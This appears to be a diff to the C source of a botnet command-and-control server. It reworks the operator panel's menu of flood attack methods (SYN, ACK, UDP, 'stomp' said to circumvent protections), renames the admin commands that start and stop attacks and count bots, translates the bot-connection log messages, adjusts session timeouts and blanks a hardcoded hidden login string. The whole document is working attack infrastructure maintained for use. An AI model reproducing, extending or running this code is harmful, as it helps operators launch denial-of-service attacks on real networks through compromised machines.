@@ -23,7 +23,7 @@
 #define MAXUSERS        30
 
 #define USER_COMMANDS   12
-#define ADMIN_COMMANDS  4
+#define ADMIN_COMMANDS  6
 
 static volatile int epoll_fd = 0, attack_id = 0, listen_fd = 0, scanning = 1, attacking = 1, operatorCount = 0, last_attack = 0;
 static uint32_t x, y, z, w;
@@ -63,25 +63,27 @@ int canprint = 0;
 int globavail;
 
 char *user_commands[USER_COMMANDS][2] = {
-    {"\r\n\x1b[1;37mMethods\x1b[0;32m:\r\n"},
-    {" \x1b[0;32m~ \x1b[1;37m.udp      \x1b[0;32m| \x1b[1;37mudp flood with less options\r\n"},
-    {" \x1b[0;32m~ \x1b[1;37m.syn      \x1b[0;32m| \x1b[1;37mtcp syn flood\r\n"},
-    {" \x1b[0;32m~ \x1b[1;37m.ack      \x1b[0;32m| \x1b[1;37mtcp ack flood\r\n"},
-    {" \x1b[0;32m~ \x1b[1;37m.null     \x1b[0;32m| \x1b[1;37mtcp flood with hex data\r\n"},
-    {" \x1b[0;32m~ \x1b[1;37m.stomp    \x1b[0;32m| \x1b[1;37mtcp 3-way handshake can circumvent most protections\r\n"},
-    {" \x1b[0;32m~ \x1b[1;37m.tcp      \x1b[0;32m| \x1b[1;37mtcp flood with custom flags\r\n"},
-    {" \x1b[0;32m~ \x1b[1;37m.stdhex   \x1b[0;32m| \x1b[1;37mstandard socket flood with hex data\r\n"},
-    {" \x1b[0;32m~ \x1b[1;37m.syndata  \x1b[0;32m| \x1b[1;37mtcp syn flood with len data\r\n"},
-    {" \x1b[0;32m~ \x1b[1;37m.sack     \x1b[0;32m| \x1b[1;37mack socket\r\n"},
-    {" \x1b[0;32m~ \x1b[1;37m.pps      \x1b[0;32m| \x1b[1;37mudp flood optimized for high pps\r\n"},
-    {"\x1b[1;37mMethods: !\x1b[0;32m[\x1b[1;37mmethod\x1b[0;32m] [\x1b[1;37mtarget\x1b[0;32m] [\x1b[1;37mduration\x1b[0;32m] dport=[\x1b[1;37mport\x1b[0;32m]\r\n"},
+    {" \r\n\x1b[1;37mMethods\x1b[0;32m:\r\n"},
+    {" \x1b[0;32m \x1b[1;37m.syn      \x1b[0;32m| \x1b[1;37mtcp syn flood\r\n"},
+    {" \x1b[0;32m \x1b[1;37m.ack      \x1b[0;32m| \x1b[1;37mtcp ack flood\r\n"},
+    {" \x1b[0;32m \x1b[1;37m.null     \x1b[0;32m| \x1b[1;37mtcp flood with hex data\r\n"},
+    {" \x1b[0;32m \x1b[1;37m.stomp    \x1b[0;32m| \x1b[1;37mtcp 3-way handshake can circumvent most protections\r\n"},
+    {" \x1b[0;32m \x1b[1;37m.tcp      \x1b[0;32m| \x1b[1;37mtcp flood with custom flags\r\n"},
+    {" \x1b[0;32m \x1b[1;37m.syndata  \x1b[0;32m| \x1b[1;37mtcp syn flood with len data\r\n"},
+    {" \x1b[0;32m \x1b[1;37m.sack     \x1b[0;32m| \x1b[1;37mack socket\r\n"},
+    {" \x1b[0;32m \x1b[1;37m.stdhex   \x1b[0;32m| \x1b[1;37mstandard socket flood with hex data\r\n"},
+    {" \x1b[0;32m \x1b[1;37m.udp      \x1b[0;32m| \x1b[1;37mudp flood with less options\r\n"},
+    {" \x1b[0;32m \x1b[1;37m.pps      \x1b[0;32m| \x1b[1;37mudp flood optimized for high pps\r\n"},
+    {" \r\n\x1b[1;37mExample: .\x1b[0;32m[\x1b[1;37mmethod\x1b[0;32m] [\x1b[1;37mtarget\x1b[0;32m] [\x1b[1;37mduration\x1b[0;32m] dport=[\x1b[1;37mport\x1b[0;32m]\r\n\r\n"},
 };
 
 char *admin_commands[ADMIN_COMMANDS][2] = {
-    {"\r\nfloods <enable/disable>", "enable or disable the use of ongoing attacks"},
-    {"bots", "view total bots"},
-    {"users", "list user info from user database"},
-    {"online", "view current connected users\r\n"},
+    {"\r\n start  | stop ",  "enable or disable the use of ongoing attacks"},
+    {" bot    | bots ",  "view total bots"},
+    {" user   | users",  "list user info from user database"},
+    {" online | on   ",  "view current connected users"},
+    {" exit   | off  ",  "log out of the panel"},
+    {" clear  | cls  ",  "refresh the screen\r\n"},    
 };
 
 int fdgets(unsigned char *buffer, int bufferSize, int fd)
@@ -616,7 +618,7 @@ void *tab_title_admin(void *arg)
     }
 
 
-        sprintf(title, "\033]0;Connected: %d | Sessions: %d | Slots: %d/%d\007", botcount, usercount, attkcount, MAX_ATTACKS);
+        sprintf(title, "\033]0;Bots: %d | Online: %d | Slots: %d/%d\007", botcount, usercount, attkcount, MAX_ATTACKS);
 
         if (send(myfd, title, strlen(title), MSG_NOSIGNAL) <= 0)
         {
@@ -664,7 +666,7 @@ void *tab_title_user(void *arg)
         }
     }
 
-        sprintf(title, "\033]0;Connected: %d | Slots: %d/%d\007", botcount, attkcount, MAX_ATTACKS);
+        sprintf(title, "\033]0;Bots: %d | Slots: %d/%d\007", botcount, attkcount, MAX_ATTACKS);
 
         if (send(myfd, title, strlen(title), MSG_NOSIGNAL) <= 0)
         {
@@ -747,7 +749,7 @@ void *bot_event(void *arg)
         {
             if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
             {
-                printf("[Raz NET] Client \x1b[31mTerminated\x1b[37m %d.%d.%d.%d (bot id %s)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, clients[event.data.fd].arch);
+                printf("[Dau Dau] Client \x1b[31mDa Cham Dut\x1b[37m %d.%d.%d.%d (bot id %s)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, clients[event.data.fd].arch);
                 clearnup_connection(&clients[events[i].data.fd]);
                 continue;
             }
@@ -794,7 +796,7 @@ void *bot_event(void *arg)
 
                         if(clients[ipIndex].ip == clients[event.data.fd].ip)
                         {
-                            printf("[Raz NET] Duplicate \x1b[31mDeleted \x1b[37m%d.%d.%d.%d (bot id %s)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, clients[event.data.fd].arch);
+                            printf("[Dau Dau] Da Xoa \x1b[31mNhan Ban \x1b[37m%d.%d.%d.%d (bot id %s)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, clients[event.data.fd].arch);
                             close(event.data.fd);
                             /*if(strcmp(clients[event.data.fd].arch, " "))
                             {
@@ -839,7 +841,7 @@ void *bot_event(void *arg)
                             res = isalnum(lel);
                             if(res == 0)
                             {
-                                printf("[Raz NET] Client \x1b[31mDeclined\x1b[37m (no bot id) %d.%d.%d.%d\n", clients[events[i].data.fd].ip & 0xff, (clients[events[i].data.fd].ip >> 8) & 0xff, (clients[events[i].data.fd].ip >> 16) & 0xff, (clients[events[i].data.fd].ip >> 24) & 0xff);
+                                printf("[Dau Dau] Client \x1b[31mTu Choi\x1b[37m (no bot id) %d.%d.%d.%d\n", clients[events[i].data.fd].ip & 0xff, (clients[events[i].data.fd].ip >> 8) & 0xff, (clients[events[i].data.fd].ip >> 16) & 0xff, (clients[events[i].data.fd].ip >> 24) & 0xff);
                                 clearnup_connection(&clients[events[i].data.fd]);
                                 break;
                             }
@@ -855,7 +857,7 @@ void *bot_event(void *arg)
                             }
                             */
                             clients[events[i].data.fd].connected = 1;
-                            printf("[Raz NET] Client \x1b[32mAccepted\x1b[37m %d.%d.%d.%d (bot id %s)\n", clients[events[i].data.fd].ip & 0xff, (clients[events[i].data.fd].ip >> 8) & 0xff, (clients[events[i].data.fd].ip >> 16) & 0xff, (clients[events[i].data.fd].ip >> 24) & 0xff, clients[events[i].data.fd].arch);
+                            printf("[Dau Dau] Client \x1b[32mChap Nhan\x1b[37m %d.%d.%d.%d (bot id %s)\n", clients[events[i].data.fd].ip & 0xff, (clients[events[i].data.fd].ip >> 8) & 0xff, (clients[events[i].data.fd].ip >> 16) & 0xff, (clients[events[i].data.fd].ip >> 24) & 0xff, clients[events[i].data.fd].arch);
                         }
                     }
 
@@ -1085,7 +1087,7 @@ void *detect_afk(void *arg)
     int the_fd = *((int *)arg);
     while(1)
     {
-        if(time(NULL) - accinfo[the_fd].lastcmd_time > 1200)
+        if(time(NULL) - accinfo[the_fd].lastcmd_time > 1800)
         {
             char fbuf[512];
             sprintf(fbuf, "Dude, it's been too long since you used botnet, log out to save server resources ;)\n");
@@ -1096,7 +1098,7 @@ void *detect_afk(void *arg)
             break;
         }
 
-        if(time(NULL) - accinfo[the_fd].time_logged > 3000)
+        if(time(NULL) - accinfo[the_fd].time_logged > 1800)
         {
             char fbuf[512];
             sprintf(fbuf, "you've been logged in for WAY too long, go touch grass.\n");
@@ -1152,7 +1154,7 @@ void *controller_thread(void *arg)
     read(accinfo[cfd].fd, hidden, sizeof(hidden));
     trim(hidden); hidden[strcspn(hidden, "\n")] = 0;
 
-    if (strcmp(hidden, "raznet2022") != 0)
+    if (strcmp(hidden, "") != 0)
     {
         close(accinfo[cfd].fd);
         memset(username, 0, sizeof(username));
@@ -1318,9 +1320,9 @@ void *controller_thread(void *arg)
         memset(prompt, 0, sizeof(prompt));
 
         if (accinfo[cfd].admin == 1)
-            sprintf(prompt, "\x1b[0;32m%s@botnet\x1b[1;37m:\x1b[0;36m/usr/admin/\033[0m$ ", username);
+            sprintf(prompt, "\x1b[0;32m%s@botnet\x1b[1;37m:\x1b[0;36madmin\033[0m$ ", username);
         else
-            sprintf(prompt, "\x1b[0;32m%s@botnet\x1b[1;37m:\x1b[0;36m/usr/customer/\033[0m$ ", username);
+            sprintf(prompt, "\x1b[0;32m%s@botnet\033[0m$ ", username);
 
         write(accinfo[cfd].fd, prompt, strlen(prompt));
 
@@ -1401,13 +1403,13 @@ void *controller_thread(void *arg)
             }
 
         }
-        else if (strcmp(rdbuf, "clear") == 0 || strcmp(rdbuf, "c") == 0 || strcmp(rdbuf, "cls") == 0)
+        else if (strcmp(rdbuf, "clear") == 0 || strcmp(rdbuf, "cls") == 0)
         {
             strcpy(accinfo[cfd].lastcmd, rdbuf);
             write(accinfo[cfd].fd, "\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n", strlen("\033[?1049h") + 16);
             sendbanner(accinfo[cfd].fd);
         }
-        else if ((strcmp(rdbuf, "admin") == 0 || strcmp(rdbuf, "controlpanel") == 0) && accinfo[cfd].admin == 1)
+        else if ((strcmp(rdbuf, "admin") == 0 || strcmp(rdbuf, "panel") == 0) && accinfo[cfd].admin == 1)
         {
             int i = 0;
 
@@ -1419,7 +1421,7 @@ void *controller_thread(void *arg)
                 memset(adm_help, 0, sizeof(adm_help));
             }
         }
-        else if (strcmp(rdbuf, "exit") == 0 || strcmp(rdbuf, "quit") == 0 || strcmp(rdbuf, "^C") == 0)
+        else if (strcmp(rdbuf, "exit") == 0 || strcmp(rdbuf, "off") == 0)
         {
             write(accinfo[cfd].fd, "\x1b[32mGoodbye, see you again\r\n", strlen("\x1b[32mGoodbye, see you again\r\n"));
             accinfo[cfd].connected = 0;
@@ -1431,21 +1433,21 @@ void *controller_thread(void *arg)
             memset(hidden, 0, sizeof(hidden));
             pthread_exit(0);
         }
-        else if (strcmp(rdbuf, "floods enable") == 0 && accinfo[cfd].admin == 1)
+        else if (strcmp(rdbuf, "start") == 0 && accinfo[cfd].admin == 1)
         {
             strcpy(accinfo[cfd].lastcmd, rdbuf);
             logcmd(accinfo[cfd].fd);
             write(accinfo[cfd].fd, "\x1b[0;36mThe attack function has been successfully enabled!\r\n", strlen("\x1b[0;36mThe attack function has been successfully enabled!\r\n"));
             attacking = 1;
         }
-        else if (strcmp(rdbuf, "floods disable") == 0 && accinfo[cfd].admin == 1)
+        else if (strcmp(rdbuf, "stop") == 0 && accinfo[cfd].admin == 1)
         {
             strcpy(accinfo[cfd].lastcmd, rdbuf);
             logcmd(accinfo[cfd].fd);
             write(accinfo[cfd].fd, "\x1b[0;36mThe attack function has been successfully disabled!\r\n", strlen("\x1b[0;36mThe attack function has been successfully disabled!\r\n"));
             attacking = 0;
         }
-        else if ((strcmp(rdbuf, "bots") == 0 || strcmp(rdbuf, "botcount") == 0) && accinfo[cfd].admin == 1)
+        else if ((strcmp(rdbuf, "bots") == 0 || strcmp(rdbuf, "bot") == 0) && accinfo[cfd].admin == 1)
         {
             strcpy(accinfo[cfd].lastcmd, rdbuf);
             logcmd(accinfo[cfd].fd);
@@ -1467,7 +1469,7 @@ void *controller_thread(void *arg)
             botcount(accinfo[cfd].fd, 2, query_line);
         }
 
-        else if ((strcmp(rdbuf, "online") == 0) && accinfo[cfd].admin == 1)
+        else if ((strcmp(rdbuf, "online") == 0 || strcmp(rdbuf, "on") == 0) && accinfo[cfd].admin == 1)
         {
             char tempbuf[2048];
             int f;
@@ -1483,7 +1485,7 @@ void *controller_thread(void *arg)
             logcmd(accinfo[cfd].fd);
         }
 
-        else if ((strcmp(rdbuf, "users") == 0 || strcmp(rdbuf, "userlist") == 0) && accinfo[cfd].admin == 1)
+        else if ((strcmp(rdbuf, "users") == 0 || strcmp(rdbuf, "user") == 0) && accinfo[cfd].admin == 1)
         {
             strcpy(accinfo[cfd].lastcmd, rdbuf);
             logcmd(accinfo[cfd].fd);
